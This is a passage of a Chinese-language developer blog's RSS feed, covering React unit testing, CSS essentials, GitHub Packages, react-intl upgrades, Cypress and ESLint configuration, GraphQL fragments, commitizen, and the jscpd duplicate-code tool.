<span class="hljs-keyword">import</span> React, { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Counter</span>(<span class="hljs-params"></span>) </span>{
  <span class="hljs-keyword">const</span> [count, setCount] = useState(<span class="hljs-number">0</span>)
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count - 1)}&gt;
        -
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{count}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;
        +
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}

<span class="hljs-comment">// src/components/counter/counter.test.js</span>
<span class="hljs-keyword">import</span> React <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>
<span class="hljs-keyword">import</span> { render, fireEvent } <span class="hljs-keyword">from</span> <span class="hljs-string">"@testing-library/react"</span>
<span class="hljs-keyword">import</span> Counter <span class="hljs-keyword">from</span> <span class="hljs-string">"."</span>

test(<span class="hljs-string">"&lt;Counter /&gt;"</span>, () =&gt; {
  <span class="hljs-keyword">const</span> { getByText } = render(<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Counter</span> /&gt;</span></span>)

  expect(getByText(<span class="hljs-string">"0"</span>)).toBeTruthy()

  fireEvent.click(getByText(<span class="hljs-string">"+"</span>))

  expect(getByText(<span class="hljs-string">"1"</span>)).toBeTruthy()

  fireEvent.click(getByText(<span class="hljs-string">"-"</span>))
  fireEvent.click(getByText(<span class="hljs-string">"-"</span>))

  expect(getByText(<span class="hljs-string">"-1"</span>)).toBeTruthy()
})</code></pre><h2 class="">3. 常见问题</h2><ul><li>我应该在哪写 Unit Testing？</li></ul><p>没有强制约定，个人认为测试代码和源码放在项目文件夹更容易管理。</p><p>如上面例子：测试代码和源码都存放在 <code>src/components/counter/</code> 中。</p><ul><li>自动补全 Jest 函数和断言的？</li></ul><pre class="bash hljs"><code>yarn add @types/jest</code></pre><ul><li>如何查看测试覆盖率？</li></ul><pre class="bash hljs"><code>yarn <span class="hljs-built_in">test</span> --coverage</code></pre><ul><li>如何自动化测试？</li></ul><p>以 GitHub Actions 为例：新建 <code>.github/workflows/pull_request.yml</code>，并编写如下代码</p><pre class="yaml hljs"><code>  <span class="hljs-attr">name:</span> <span class="hljs-string">"PR Checks"</span>

  <span class="hljs-attr">on:</span> <span class="hljs-string">pull_request</span>

  <span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">test:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">Unit</span> <span class="hljs-string">Tests</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Check</span> <span class="hljs-string">out</span> <span class="hljs-string">code</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@master</span>

      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">dependencies</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">yarn</span> <span class="hljs-string">install</span> <span class="hljs-string">--non-interactive</span> <span class="hljs-string">--no-progress</span> <span class="hljs-string">--frozen-lockfile</span> <span class="hljs-string">--ignore-optional</span>

      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">tests</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">yarn</span> <span class="hljs-string">test</span>
        <span class="hljs-attr">env:</span>
          <span class="hljs-attr">CI:</span> <span class="hljs-literal">true</span></code></pre><p>代码：<a class="tc-tiddlylink-external" href="https://github.com/ThaddeusJiang/react-testing-example/pull/1" rel="noopener noreferrer" target="_blank">https://github.com/ThaddeusJiang/react-testing-example/pull/1</a></p><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://testing-library.com/docs/react-testing-library/intro" rel="noopener noreferrer" target="_blank">https://testing-library.com/docs/react-testing-library/intro</a></li><li><a class="tc-tiddlylink-external" href="https://jestjs.io/docs/en/tutorial-react" rel="noopener noreferrer" target="_blank">https://jestjs.io/docs/en/tutorial-react</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 27 January 2021 22:34:17 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2019-11-18-react-testing-1—unit-testing</guid>      
   </item>

   <item>
      <title>2019-11-13 20% CSS</title>
      <link>https://thaddeusjiang.com/2019-11-13-20–css</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2019-11-13 20% CSS</h1>
            <hr>

            <p>我是一名 Web 开发者，日常工作中主要使用的技术是 JS 和 CSS。相比 JS ，我认为自己没有认真研究过 CSS 的技术细节。虽然如此，但是我有自信可以实现 “任意 UI”。因为我熟练掌握 20% CSS，并擅长查看其他网站的 CSS 源码。</p><p>在这里分享一下我的 20% CSS。</p><p><img src="https://i.gyazo.com/fc726a706533e4b298ee07d1e85cdeb5.png"></p><h2 class="">1. 必须熟练掌握的基本知识</h2><p>1.1. CSS 选择器</p><p>你需要掌握</p><ul><li>class 选择器</li><li>id 选择器</li><li>标签选择器</li><li>父子选择器，兄弟选择器</li><li>属性选择器</li></ul><p>1.2. CSS 单位</p><p>你需要掌握</p><ul><li>%</li><li>px</li><li>rem</li></ul><p>1.3 CSS 颜色</p><p>你需要掌握</p><ul><li>十六进制（hex）表示法</li><li>RGB 表示法</li></ul><p>1.4. CSS 边距之间关系</p><p>CSS 最基本的边距主要是 <code>margin</code> 和 <code>padding</code>，他们的关系如下：</p><p><img src="https://i.gyazo.com/2537725d5fa341801f2da60e27320455.gif"></p><h2 class="">2. 必须熟练掌握的基本场景</h2><p>2.1 CSS 布局</p><p>你需要掌握</p><ul><li>position 位置布局</li><li>flex 弹性布局</li><li>float 流布局</li><li>column 列布局</li></ul><p>我有一份非常简洁的 [CSS 布局教程](<a class="tc-tiddlylink-external" href="http://learnlayout.com/" rel="noopener noreferrer" target="_blank">http://learnlayout.com/</a>)。</p><p>2.2. CSS 显示</p><p>你需要掌握</p><ul><li>display<ul><li>none/block/inline-block</li></ul></li><li>边框<ul><li>border</li><li>border-radius</li></ul></li><li>颜色<ul><li>background-color</li><li>color</li></ul></li><li>阴影<ul><li>box-shadow</li><li>text-shadow</li></ul></li><li>文本<ul><li>font-family</li><li>font-size</li><li>font-weight</li><li>text-decoration</li><li>word-wrap</li></ul></li><li>伪类<ul><li>:hover :focus</li><li>::before ::after</li></ul></li><li>...</li></ul><p>2.3 CSS 媒体查询</p><p>媒体查询主要应对响应式设计。</p><p>Google 提供了一份非常好的响应式设计教程。<a class="tc-tiddlylink-external" href="https://developers.google.com/web/fundamentals/design-and-ux/responsive" rel="noopener noreferrer" target="_blank">https://developers.google.com/web/fundamentals/design-and-ux/responsive</a></p><h2 class="">3. 重要，但会查文档即可</h2><ul><li>渐变</li><li>过渡</li><li>动画</li><li>2D/3D 转换</li></ul><p>最后，本文不是 CSS 教程，更像是一个“迷你关键字列表”。</p><p>希望能帮助到你。
</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 27 January 2021 22:26:20 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2019-11-13-20–css</guid>      
   </item>

   <item>
      <title>2019-11-08 踩了一下 GitHub package 大水坑</title>
      <link>https://thaddeusjiang.com/2019-11-08–cai-liao-yi-xia-github-package–da-shui-kang</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2019-11-08 踩了一下 GitHub package 大水坑</h1>
            <hr>

            <p>GitHub 今年新发布的功能有很多，有 Actions、Sponsor 和 Package 等等。</p><p>昨天我不小心踩了一下 GitHub package 大水坑，折腾了一下午。</p><p>首先，我的结论是：</p><ol><li>GitHub package 不是开箱即用的</li><li>第三方 CI 尚未完全支持，如 Netlify</li><li>GitHub package 的优势在于支持不同包管理系统</li></ol><h2 class="">1. GitHub package 不是开箱即用的</h2><p>为什么这么说呢？因为我认为 npm 是开箱即用的。
回想一下我们使用 npm 的过程。</p><ol><li>首先，安装 npm</li><li>执行命令</li></ol><p>这就是么简单，不要手动配置（使用国内镜像除外）。</p><h2 class="">那么如何使用 GitHub package 呢？</h2><p>1, 首先你要注册试用 package，因为它还是 beta 版本。</p><p>2. 你必须有一个 personal access token（有 read:packages and write:package 权限）</p><p>3. 修改 .npmrc</p><pre class="bash hljs"><code>//npm.pkg.github.com/:_authToken=PERSONAL-ACCESS-TOKEN
registry=https://npm.pkg.github.com/OWNER</code></pre><p>4.  package.json 中 name 必须带有 @github_username 前缀，形如 <code>@thaddeusjiang/typography-theme-tsubaki</code></p><p>5. 发布</p><pre><code>npm publish</code></pre><p>6. 去仓库的 package 页面编辑说明文件</p><p><img src="https://i.gyazo.com/ae3fdcd3fb5575cf02ce1d87b8bc6f54.jpg"></p><h2 class="">2. 第三方 CI 尚未完全支持，如 Netlify</h2><p>如第一步所写，使用 git package 之前需要修改 .npmrc，所以我们必须手动修改第三方 CI 的 .npmrc。
否则会出现类似错误</p><p><img src="https://i.gyazo.com/988ac35f6c946ada7ec8fefa05f8890e.jpg"></p><p>为了其它正常使用你的 package，你不得不同时发布到 npm，并写一个 <a class="tc-tiddlylink-external" href="https://github.com/ThaddeusJiang/typography-theme-tsubaki/issues/3" rel="noopener noreferrer" target="_blank">https://github.com/ThaddeusJiang/typography-theme-tsubaki/issues/3</a> 去解释为什么灰安装出错。</p><h2 class="">3. GitHub package 的优势在于支持不同包管理系统</h2><p>正如 GitHub package 主页上所写，GitHub package 支持 npm、Docker、Maven、NuGet、RubyGems 等等包管理系统，低于对开源社区热情不高，且技术栈复杂的公司来说，GitHub package 还是一种可以尝试的解决方案。</p><p><img src="https://i.gyazo.com/3ac3082152e0d4c2f41d627e1d9773e9.jpg"></p><p>综上所述，我建议个人项目暂时还是不要折腾 GitHub package 比较好。</p><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://github.com/features/package-registry" rel="noopener noreferrer" target="_blank">https://github.com/features/package-registry</a></li><li><a class="tc-tiddlylink-external" href="https://help.github.com/en/github/authenticating-to-github/creating-a-personal-access-token-for-the-command-line" rel="noopener noreferrer" target="_blank">https://help.github.com/en/github/authenticating-to-github/creating-a-personal-access-token-for-the-command-line</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 26 January 2021 23:4:18 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2019-11-08–cai-liao-yi-xia-github-package–da-shui-kang</guid>      
   </item>

   <item>
      <title>2019-09-30 升级到 react-intl 3</title>
      <link>https://thaddeusjiang.com/2019-09-30–sheng-ji-dao-react-intl-3</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2019-09-30 升级到 react-intl 3</h1>
            <hr>

            <p>上周把公司项目中 react-intl 升到 v3，做一个简单记录。
这次升级策略和使用 React Hooks 时一样，不重构现有代码，但是在今后新功能中<code>积极使用</code>新的 hook API。</p><h2 class="">第一步 更新 package.json</h2><p>我直接使用 <code>npm install react-intl@latest</code> 升级到最近版本。</p><h2 class="">第二步 修复 Breaking API Changes</h2><p>我的项目中涉及到 <code>FormattedRelative</code> API。超级简单，就是改个名字而已。</p><p><img src="https://i.gyazo.com/83fd1e9ce1981486f75da48bcb8b7ce8.png"></p><h2 class="">第三步 移除遗留代码</h2><p>我说的是 <code>addLocaleData</code> API。因为我的项目是 to B 项目，客户统一使用 Chrome， 没有必要支持 IE11 等浏览器。
所以我将涉及 <code>addLocaleData</code> 代码也一并移除了。
<img src="https://i.gyazo.com/c7612e4218d3338bc24f84640bdedf6f.png"></p><h2 class="">第四步 更新 snapshot testing</h2><p>这步是必不可少的，我们项目使用 create-react-app 构建。</p><p>执行</p><pre><code>yarn test --updateSnapshot</code></pre><h2 class="">第五步 更新 flow-typed</h2><p>我们项目使用 flow 进行类型定义，npm script 定义如下：</p><pre class="json hljs"><code><span class="hljs-comment">// package.json</span>
{
  <span class="hljs-attr">"flow-typed"</span>: <span class="hljs-string">"rimraf flow-typed/npm &amp;&amp; npx flow-typed install --ignoreDeps dev bundled peer"</span>
}</code></pre><p>执行</p><pre><code>yarn flow-typed</code></pre><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://github.com/formatjs/react-intl" rel="noopener noreferrer" target="_blank">https://github.com/formatjs/react-intl</a></li><li><a class="tc-tiddlylink-external" href="https://github.com/formatjs/react-intl/blob/master/docs/Upgrade-Guide.md" rel="noopener noreferrer" target="_blank">https://github.com/formatjs/react-intl/blob/master/docs/Upgrade-Guide.md</a></li><li><a class="tc-tiddlylink-external" href="https://github.com/facebook/create-react-app" rel="noopener noreferrer" target="_blank">https://github.com/facebook/create-react-app</a></li><li><a class="tc-tiddlylink-external" href="https://github.com/flow-typed/flow-typed" rel="noopener noreferrer" target="_blank">https://github.com/flow-typed/flow-typed</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 26 January 2021 22:58:36 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2019-09-30–sheng-ji-dao-react-intl-3</guid>      
   </item>

   <item>
      <title>2019-09-21 更新 Cypress 相关配置</title>
      <link>https://thaddeusjiang.com/2019-09-21–geng-xin-cypress–xiang-guan-pei-zhi</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2019-09-21 更新 Cypress 相关配置</h1>
            <hr>

            <p>最近更新了一下 ESLint 配置，发现 Cypress 测试代码中出现了很多红线，意识到 Cypress 配置也需要更新了。</p><h2 class="">旧配置</h2><p>使用在 cypress 文件夹中配置 <code>tsconfig.json</code> 的方式，超简单。内容如下：</p><pre class="json hljs"><code>{
  <span class="hljs-attr">"compilerOptions"</span>: {
    <span class="hljs-attr">"allowJs"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">"baseUrl"</span>: <span class="hljs-string">"../node_modules"</span>,
    <span class="hljs-attr">"types"</span>: [<span class="hljs-string">"cypress"</span>]
  },
  <span class="hljs-attr">"include"</span>: [<span class="hljs-string">"**/*.*"</span>]
}</code></pre><h2 class="">新配置</h2><p>新配置分成 2 部分，ESLint 和 jsconfig.json。</p><ul><li>ESLint 负责检查 Cypress 断言的使用是否正确</li><li>jsconfig 负责 Cypress 自动补全</li></ul><h2 class="">ESLint</h2><p>1. 安装 eslint-plugin-cypress</p><pre class="sh hljs"><code>npm install eslint-plugin-cypress --save-dev</code></pre><p>2. 配置 .eslintrc.json</p><pre class="json hljs"><code><span class="hljs-comment">// .eslintrc.json</span>
{
  <span class="hljs-attr">"plugins"</span>: [<span class="hljs-string">"cypress"</span>],
  <span class="hljs-attr">"env"</span>: {
    <span class="hljs-attr">"cypress/globals"</span>: <span class="hljs-literal">true</span>
  }
}</code></pre><h2 class="">jsconfig</h2><p>在项目根目录下创建 .jsconfig.json，配置如下内容：</p><pre class="json hljs"><code><span class="hljs-comment">// .jsconfig.json</span>
{
  <span class="hljs-attr">"include"</span>: [<span class="hljs-string">"./node_modules/cypress"</span>, <span class="hljs-string">"cypress/**/*.js"</span>]
}</code></pre><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://github.com/cypress-io/eslint-plugin-cypress" rel="noopener noreferrer" target="_blank">https://github.com/cypress-io/eslint-plugin-cypress</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 26 January 2021 22:55:22 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2019-09-21–geng-xin-cypress–xiang-guan-pei-zhi</guid>      
   </item>

   <item>
      <title>2019-09-18 GraphQL 反面案例 - 多层嵌套 fragment</title>
      <link>https://thaddeusjiang.com/2019-09-18-graphql–fan-mian-an-li-—duo-ceng-qian-tao-fragment</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2019-09-18 GraphQL 反面案例 - 多层嵌套 fragment</h1>
            <hr>

            <p>不经意间使用 GraphQL 已经一年时间了，
分享一个自己走过的坑，<code>多层嵌套 fragment</code>。</p><h2 class="">首先，什么是 GraphQL fragment？</h2><blockquote class="tc-quote tc-big-quote"><p>GraphQL includes reusable units called fragments. Fragments let you construct sets of fields, and then include them in queries where you need to.
</p></blockquote><p>GraphQL fragment 允许我们定义一些常用的属性集，方便重复利用。</p><p>使用方法如下，我们定义 TagFragment， 它被利用在 ACardFragment 和 BCardFragment 中。</p><pre class="js hljs"><code><span class="hljs-keyword">const</span> TagFragment = gql<span class="hljs-string">`
  fragment TagFragment {
    id
    name
  }
`</span>

<span class="hljs-keyword">const</span> ACardFragment = gql<span class="hljs-string">`
  fragment ACard {
    id
    name
    tags {
      ...TagFragment
    }
  }
`</span>

<span class="hljs-keyword">const</span> BCardFragment = gql<span class="hljs-string">`
  fragment BCard {
    id
    name
    tags {
      ...TagFragment
    }
  }
`</span></code></pre><h2 class="">为什么说嵌套 fragment 是反面教材？</h2><p>这里我们定义 TagFragment、BCardFragment、AFromFragment 如下，并在 AFormQuery 中使用 AFormFragment。</p><p>你会发现，虽然 AFormQuery 只使用了 AFormFragment，但是由于多层嵌套 fragment 的原因，你不得不同时引用 BCardFragment 和 TagFragment。</p><pre class="js hljs"><code><span class="hljs-keyword">const</span> TagFragment = gql<span class="hljs-string">`
  fragment TagFragment {
    id
    name
  }
`</span>

<span class="hljs-keyword">const</span> BCardFragment = gql<span class="hljs-string">`
  fragment BCardFragment {
    id
    name
    tags {
      ...TagFragment
    }
  }
`</span>

<span class="hljs-keyword">const</span> AFormFragment = gql<span class="hljs-string">`
  fragment AFormFragment {
     id
     name
     bs {
       ...BCardFragment
     }
  }
`</span>

<span class="hljs-comment">// only reference AFormFragment, have to inject BCardFragment and TagFragment</span>
<span class="hljs-keyword">const</span> AFormQuery = gql<span class="hljs-string">`
  query {
    ...AFormFragment
  }
  <span class="hljs-subst">${AFormFragment}</span>
  <span class="hljs-subst">${BCardFragment}</span>
  <span class="hljs-subst">${TagFragment}</span>
`</span></code></pre><h2 class="">如何解决上面问题呢？</h2><p>其实很简单。</p><blockquote class="tc-quote tc-big-quote"><p>只需保证每个 fragment 都不向外传递除自己以外的 fragment 即可。
</p></blockquote><p>如下</p><pre class="js hljs"><code><span class="hljs-keyword">const</span> TagFragment = gql<span class="hljs-string">`
  fragment TagFragment {
    id
    name
  }
`</span>

<span class="hljs-keyword">const</span> BCardFragment = gql<span class="hljs-string">`
  fragment BCard {
    id
    name
    tags {
      ...TagFragment
    }
  }
  <span class="hljs-subst">${TagFragment}</span> // inject
`</span>

<span class="hljs-keyword">const</span> AFormFragment = gql<span class="hljs-string">`
  fragment AFormFragment {
     id
     name
     bs {
       ...BCardFragment
     }
  }
  <span class="hljs-subst">${BCardFragment}</span> // inject
`</span>
<span class="hljs-comment">// only need AFormFragment</span>
<span class="hljs-keyword">const</span> AFormQuery = gql<span class="hljs-string">`
  query {
    ...AFormFragment
  }
  <span class="hljs-subst">${AFormFragment}</span>
`</span></code></pre><p>希望您可以避开这个坑。</p><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://graphql.org/" rel="noopener noreferrer" target="_blank">https://graphql.org/</a></li><li><a class="tc-tiddlylink-external" href="https://graphql.org/learn/queries/#fragments" rel="noopener noreferrer" target="_blank">https://graphql.org/learn/queries/#fragments</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 26 January 2021 22:51:33 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2019-09-18-graphql–fan-mian-an-li-—duo-ceng-qian-tao-fragment</guid>      
   </item>

   <item>
      <title>2019-07-15 使用 git cz 标准化提交记录</title>
      <link>https://thaddeusjiang.com/2019-07-15–shi-yong-git-cz–biao-zhun-hua-ti-jiao-ji-lu</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2019-07-15 使用 git cz 标准化提交记录</h1>
            <hr>

            <p>自从开始使用 git cz 取代 git commit -m，提交记录变得非常干净、漂亮，这整个过程也没有任何额外负担，非常自然。</p><h2 class="">安装 git cz</h2><pre class="sh hljs"><code>// install
$ npm install -g commitizen cz-conventional-changelog

// config file
$ <span class="hljs-built_in">echo</span> <span class="hljs-string">'{ "path": "cz-conventional-changelog" }'</span> &gt; ~/.czrc

// install vscode extension
$ code --install-extension axetroy.vscode-changelog-generator</code></pre><h2 class="">使用</h2><pre><code>$ git add .
$ git cz</code></pre>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 26 January 2021 22:50:6 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2019-07-15–shi-yong-git-cz–biao-zhun-hua-ti-jiao-ji-lu</guid>      
   </item>

   <item>
      <title>2019-07-11 从 jsinspect 迁移到 jscpd</title>
      <link>https://thaddeusjiang.com/2019-07-11–cong-jsinspect–qian-yi-dao-jscpd</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2019-07-11 从 jsinspect 迁移到 jscpd</h1>
            <hr>

            <blockquote class="tc-quote tc-big-quote"><p>jscpd 是一个用于检测重复代码的工具，拒绝 copy/pause 从选择优秀的工具开始。
</p></blockquote><p>目前负责的项目的 package.json 中有如下命令：</p><pre class="json hljs"><code><span class="hljs-comment">//  package.json</span>
{
  <span class="hljs-attr">"scripts:"</span>: {
    <span class="hljs-attr">"check:quality"</span>: <span class="hljs-string">"npx jsinspect -t 50 src"</span>,
  }
}</code></pre><p>但是，这只是从上一个项目继承过来的祖传代码，从来没有人使用过。</p><p>一般情况下，我的原则都是没有用的代码，全部删除。
但是存在必有其存在的道理，先分析一下。</p><ul><li>这段代码有什么作用？<ul><li>jsinspect 检查复制/粘贴，或者类似代码的工具。</li></ul></li><li>为什么没有人使用？<ul><li>我运行了一下，结果得到一大堆 log，十分茫然，不知道接下来要做什么。</li><li>没有简单易懂的结果报告。</li></ul></li></ul><p>从上面分析可以看出，功能还是有用的，最起码能知道项目中有多少重复代码。就是工具选择的不恰当，没有易用性。</p><p>改进方法就是寻找替代方案。
于是我找到 jscpd</p><h2 class="">jscpd 对比 jsinspect 优势</h2><ol><li>仍在维护。（这点太重要了）</li><li>运行结果内容清晰，且报告比较美观。</li></ol><h2 class="">jscpd 使用</h2><p>官网示例非常简单，推荐直接阅读。</p><p>TL;DR</p><p>1. config file</p><pre class="json hljs"><code>{
  <span class="hljs-attr">"threshold"</span>: <span class="hljs-number">0.1</span>,
  <span class="hljs-attr">"reporters"</span>: [<span class="hljs-string">"html"</span>, <span class="hljs-string">"console"</span>],
  <span class="hljs-attr">"ignore"</span>: [<span class="hljs-string">"**/__snapshots__/**"</span>],
  <span class="hljs-attr">"absolute"</span>: <span class="hljs-literal">true</span>
}</code></pre><p>- package.json</p><pre class="json hljs"><code>{
  <span class="hljs-attr">"scripts:"</span>: {
    <span class="hljs-attr">"check:quality"</span>: <span class="hljs-string">"npx jscpd src"</span>,
  }
}</code></pre><p>运行结果对比：左：jsinspect，右：jscpd
<img src="https://i.gyazo.com/ed66c11ed7e90eb87c34c9391a055855.jpg"></p><p>对比之后，效果显而易见。jscpd 完胜。</p><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://github.com/kucherenko/jscpd" rel="noopener noreferrer" target="_blank">https://github.com/kucherenko/jscpd</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 26 January 2021 22:44:18 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2019-07-11–cong-jsinspect–qian-yi-dao-jscpd</guid>      
   </item>

   <item>
      <title>2019-05-16 前端性能优化（一）性能评估</title>
      <link>https://thaddeusjiang.com/2019-05-16–qian-duan-xing-nen-you-hua–yi–xing-nen-ping-gu</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2019-05-16 前端性能优化（一）性能评估</h1>
            <hr>

            <p>前端性能优化是一个老生常谈的话题，是每一个前端开发者都避不开的技术。
本文主要介绍一下性能优化的第一步，也是最重要的一步。如何性能评估。</p><p>为什么说性能评估是最重要的一步呢？</p><blockquote class="tc-quote tc-big-quote"><p>方向错了，再怎么努力也没用。
